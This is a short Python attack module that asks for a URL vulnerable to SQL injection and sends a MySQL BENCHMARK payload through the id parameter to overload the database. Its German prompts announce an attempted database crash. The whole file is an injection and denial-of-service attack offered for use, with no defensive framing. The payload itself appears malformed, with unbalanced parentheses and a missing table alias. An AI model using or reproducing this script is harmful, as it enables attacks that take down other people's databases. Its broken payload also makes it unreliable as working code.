# modules/attacks/mysql_crash.py
import requests

def crash_mysql():
    target = input("🎯 Vulnerable URL (mit SQLi): ")
    payload = "1 AND (SELECT 1 FROM (SELECT BENCHMARK(10000000,MD5(NOW())))--"
    response = requests.get(f"{target}?id={payload}")
    print("✅ Datenbank-Crash versucht (wenn verwundbar)")
